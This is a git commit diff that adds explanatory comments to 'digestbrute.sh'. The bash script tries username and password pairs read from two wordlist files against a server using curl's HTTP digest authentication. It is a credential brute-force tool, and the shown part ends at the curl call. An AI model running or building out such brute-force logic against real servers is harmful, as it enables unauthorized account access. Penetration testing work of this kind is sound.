6305cbf2d32b36f7e093f37261b72b288298e356
Oguzhan Filizlibay <filizlibay@hotmail.com>
2020-03-28 08:32:14 +0400

    added information on parameters

--- digestbrute.sh
+++ digestbrute.sh
@@ -1,4 +1,10 @@
 #!/bin/bash
+# first parameter username is read line by line from $2, the second parameter passed to the script
+# second parameter password is read from $3 file
+# $1, the first parameter after the script name is the server address
+# parameters in bash start from $0 which is the name of the script itself
+# $# is the number of parameters passed to the script, you can check for this with an if in the beginning
+
 while read username; do
         while read password; do
                 content=$(curl -s --digest -u $username:$password $1)
